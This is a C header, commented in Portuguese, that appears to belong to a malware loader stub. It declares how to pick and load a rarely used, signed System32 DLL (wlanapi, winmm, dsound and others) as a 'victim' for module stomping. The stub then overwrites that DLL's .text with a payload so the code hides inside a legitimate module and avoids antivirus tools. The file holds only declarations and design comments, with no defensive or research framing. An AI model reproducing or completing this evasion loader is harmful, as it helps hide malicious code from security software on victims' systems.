/* stub_victim.h — Escolha runtime de DLL vítima para module stomping (P4-alt.2).
 *
 * Critérios:
 *   - DLL listada em System32 (caminho assinado).
 *   - Raramente usada: stub não importa nada dela; jogos/AVs também não.
 *   - Sem TLS callbacks (preserva nossa lógica de entrypoint).
 *   - `.text` virtual size ≥ payload `.text` size (espaço para stomp).
 *   - HMODULE válido após LoadLibraryEx.
 *
 * Ordem de tentativa (rotativa por build via build_payload_ver):
 *   wlanapi.dll, dot3api.dll, mfplat.dll, winmm.dll, msdmo.dll, dsound.dll
 *
 * Após escolher, a DLL é mantida carregada (HMODULE retornado) até o cleanup.
 */
#pragma once
#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

typedef struct StubVictim {
    HMODULE      hMod;          /* HMODULE da vítima (ainda não stompada) */
    BYTE*        baseVA;        /* base virtual do módulo (== (BYTE*)hMod) */
    DWORD        sizeOfImage;   /* SizeOfImage da vítima (limite útil de stomp) */
    BYTE*        textVA;        /* endereço virtual do .text */
    DWORD        textSize;      /* tamanho virtual do .text */
    BYTE*        snapshot;      /* cópia heap da imagem inteira (para revert) */
    SIZE_T       snapshotLen;   /* == sizeOfImage */
    WCHAR        path[MAX_PATH];/* caminho completo da DLL escolhida */
} StubVictim;

/* Escolhe + carrega vítima.  Retorna 0 em sucesso, negativo em falha:
 *   -1 nenhum candidato passa nos critérios
 *   -2 SizeOfImage insuficiente em todos os candidatos
 *   -3 erro de heap
 *
 * `minImageSize` = SizeOfImage mínimo do payload (precisamos copiar a imagem
 * inteira dentro do espaço da vítima; .text + .rdata + .data + reloc etc.).
 */
int  StubVictim_Pick(StubVictim* out, DWORD minImageSize);

/* Liberta o snapshot heap.  NÃO faz FreeLibrary — caller controla
 * (porque após `PayloadMain` retornar a vítima ainda pode estar
 * executando código stompado em outra thread). */
void StubVictim_FreeSnapshot(StubVictim* v);

#ifdef __cplusplus
}
#endif
